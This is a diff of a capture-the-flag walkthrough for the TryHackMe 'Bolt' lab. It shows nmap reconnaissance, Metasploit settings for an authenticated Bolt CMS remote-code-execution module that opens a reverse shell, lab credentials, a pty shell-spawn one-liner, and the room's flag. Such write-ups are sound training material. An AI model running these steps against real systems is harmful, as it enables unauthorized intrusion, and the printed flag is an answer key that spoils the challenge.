@@ -10,7 +10,7 @@
 
 ### Task 1 - Deploy the machine
 
-🎯 Target IP: `10.10.XX.XX`
+🎯 Target IP: `10.10.10.179`
 
 Create a directory for machine on the Desktop and a directory containing the scans with nmap.
 
@@ -18,7 +18,7 @@ Create a directory for machine on the Desktop and a directory containing the sca
 
 ```bash
 su
-echo "10.10.188.138 bolt.thm" >> /etc/hosts
+echo "10.10.10.179 bolt.thm" >> /etc/hosts
 
 mkdir thm/bolt.thm  
 cd thm/bolt.thm
@@ -32,10 +32,10 @@ I prefer to start recon by pinging the target, this allows us to check connectiv
 
 ```bash
 ping -c 3 bolt.thm
-PING bolt.thm (10.10.188.138) 56(84) bytes of data.
-64 bytes from bolt.thm (10.10.188.138): icmp_seq=1 ttl=63 time=62.3 ms
-64 bytes from bolt.thm (10.10.188.138): icmp_seq=2 ttl=63 time=65.0 ms
-64 bytes from bolt.thm (10.10.188.138): icmp_seq=3 ttl=63 time=63.0 ms
+PING bolt.thm (10.10.10.179) 56(84) bytes of data.
+64 bytes from bolt.thm (10.10.10.179): icmp_seq=1 ttl=63 time=62.3 ms
+64 bytes from bolt.thm (10.10.10.179): icmp_seq=2 ttl=63 time=65.0 ms
+64 bytes from bolt.thm (10.10.10.179): icmp_seq=3 ttl=63 time=63.0 ms
 ```
 
 Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix system (probably Linux), while Windows systems usually have a TTL of 128 secs.
@@ -51,12 +51,12 @@ nmap --open -n -Pn -vvv -T4 bolt.thm
 ```bash
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-30 16:33 EDT
 Initiating SYN Stealth Scan at 16:33
-Scanning bolt.thm (10.10.188.138) [1000 ports]
-Discovered open port 22/tcp on 10.10.188.138
-Discovered open port 80/tcp on 10.10.188.138
-Discovered open port 8000/tcp on 10.10.188.138
+Scanning bolt.thm (10.10.10.179) [1000 ports]
+Discovered open port 22/tcp on 10.10.10.179
+Discovered open port 80/tcp on 10.10.10.179
+Discovered open port 8000/tcp on 10.10.10.179
 Completed SYN Stealth Scan at 16:33, 1.06s elapsed (1000 total ports)
-Nmap scan report for bolt.thm (10.10.188.138)
+Nmap scan report for bolt.thm (10.10.10.179)
 Host is up, received user-set (0.070s latency).
 Scanned at 2023-06-30 16:33:33 EDT for 1s
 Not shown: 997 closed tcp ports (reset)
@@ -231,35 +231,48 @@ exploit/unix/webapp/bolt_authenticated_rce
 
 #### 2.8 - Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit
 
-
-
-
-
 * RHOST is the ip of the machine
 * LHOST is the ip of our machine’s vpn ( note: we don’t get reverse shell if we use our own ip )
 * USERNAME and PASSWORD is that we found in previous enumeration
 * TARGETURI is where you want to put our website url. here its bolt website in port 8000
 
+<pre class="language-bash"><code class="lang-bash"><strong>set RHOST bolt.thm
+</strong><strong>set LHOST tun0
+</strong>set USERNAME bolt
+set PASSWORD boltadmin123
+exploit
+</code></pre>
 
+<figure><img src=".gitbook/assets/Schermata del 2023-07-02 11-20-50 (1).png" alt=""><figcaption><p>root shell</p></figcaption></figure>
 
+#### 2.9 - Look for flag.txt inside the machine.
 
+flag is usually in the path: /home
 
+```bash
+cd /home
+ls
+bolt
+composer-setup.php
+flag.txt
+cat flag.txt
+```
 
+or we can spawn a bash shell
 
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
 
-
-
-
-#### 2.9 - Look for flag.txt inside the machine. 
-
-
-
-
+```bash
+find / -type f -name 'flag.txt' 2>/dev/null
+cat /root/flag.txt
+```
 
 <details>
 
-<summary>🚩 Flag 1 (user.txt)</summary>
+<summary>🚩 Flag 1 (flag.txt)</summary>
 
-
+THM{wh0\_d035nt\_l0ve5\_b0l7\_r1gh7?}
 
 </details>
